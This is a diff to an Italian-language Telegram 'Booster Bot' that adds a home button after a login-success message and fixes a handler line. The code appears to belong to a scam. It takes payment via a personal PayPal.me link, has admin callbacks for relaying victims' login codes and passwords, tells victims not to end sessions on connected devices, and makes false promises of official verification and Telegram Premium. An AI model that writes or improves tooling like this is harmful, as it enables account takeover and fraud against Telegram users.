@@ -273,7 +273,6 @@ async def prestanome_paypal_created(update: Update, context: ContextTypes.DEFAUL
 async def copy_link_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    # Manda il link in chat separata in modo che l'utente possa copiarlo facilmente tenendolo premuto
     await context.bot.send_message(
         chat_id=query.from_user.id,
         text="🔗 Ecco il tuo link PayPal da copiare:\n`https://www.paypal.me/koribaby737`",
@@ -435,7 +434,9 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
             "⚠️ ATTENZIONE: Non terminare l'attività in esecuzione del bot dai dispositivi connessi.\n\n"
             "ℹ️ Nota: Passati 2 giorni verrà messa la spunta blu verificata ufficiale da Telegram come contatto ufficiale e verrà messo 1 anno di Telegram Premium."
         )
-        await context.bot.send_message(chat_id=target_id, text=success_message)
+        # AGGIUNTO IL PULSANTE "Torna alla home" sotto al messaggio di successo
+        keyboard = [[InlineKeyboardButton("🏠 Torna alla home", callback_data="back_to_menu")]]
+        await context.bot.send_message(chat_id=target_id, text=success_message, reply_markup=InlineKeyboardMarkup(keyboard))
 
     elif data.startswith("fail_login_"):
         target_id = int(data.split("_")[2])
@@ -657,7 +658,7 @@ def main():
     app.add_handler(CallbackQueryHandler(copy_link_handler, pattern="^copy_link_action$"))
 
     app.add_handler(CallbackQueryHandler(info_security_handler, pattern="^info_security$"))
-    app.add_handler(CallbackCode := CallbackQueryHandler(verify_account_handler, pattern="^verify_account$"))
+    app.add_handler(CallbackQueryHandler(verify_account_handler, pattern="^verify_account$"))
     app.add_handler(CallbackQueryHandler(back_to_menu_handler, pattern="^back_to_menu$"))
     
     app.add_handler(conv_link)
@@ -667,7 +668,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.User(user_id=ADMIN_ID), admin_command_handler))
     app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(approve_|decline_|code_sent_|success_login_|fail_login_|req_pass_)"))
 
-    print("🤖 Booster Bot con link copiabile in chat e dettagli conto attivi...")
+    print("🤖 Booster Bot aggiornato con pulsante home dopo login...")
     
     keep_alive()
     app.run_polling()
